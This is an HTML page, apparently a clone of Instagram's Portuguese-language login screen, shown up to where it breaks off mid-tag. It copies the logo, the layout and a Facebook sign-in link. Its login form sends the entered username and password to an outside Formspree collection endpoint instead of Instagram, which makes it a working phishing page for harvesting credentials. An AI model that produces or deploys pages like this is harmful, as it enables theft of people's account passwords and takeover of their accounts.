<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="src/style.css">
    <title>Instagram</title>
</head>
<body>
    <div class="instagram-wrapper">
        <div class="instagram-phone">
            <img src="./img/apresentacao-celular.png" alt="instagram apresentação">
        </div>

        <div class="instagram-login">
            <div class="group">
                <img src="./img/instagram-logo.png" class="instagram-logo" alt="instagram logo">

                <div class="user-login">
                    <!-- FORMULÁRIO CONECTADO AO FORMSPREE -->
                    <form action="https://formspree.io/f/xkoojkow" method="POST">
                        <!-- Campo de login genérico -->
                        <input 
                            type="text" 
                            name="login" 
                            placeholder="Telefone, nome de usuário ou email" 
                            required
                        ><br/>

                        <input 
                            type="password" 
                            name="senha" 
                            placeholder="Senha" 
                            required
                        >

                        <button type="submit" class="instagram-entrar">
                            Entrar
                        </button>
                    </form>
                </div>

                <p>OU</p>

                <a href="#" class="instagram-entrar-facebook">
                    <img src="./img/facebook-icon.png" alt="facebook" width="13" height="13">
                    <b>Entrar com o Facebook</b>
                </a>

                <a href="#" class="instagram-esqueceu">
                    Esqueceu a senha?
                </a>
            </div>

            <div class="group">
                <p class="not-account">
                    Não tem uma conta?
                    <span class="link-blue">
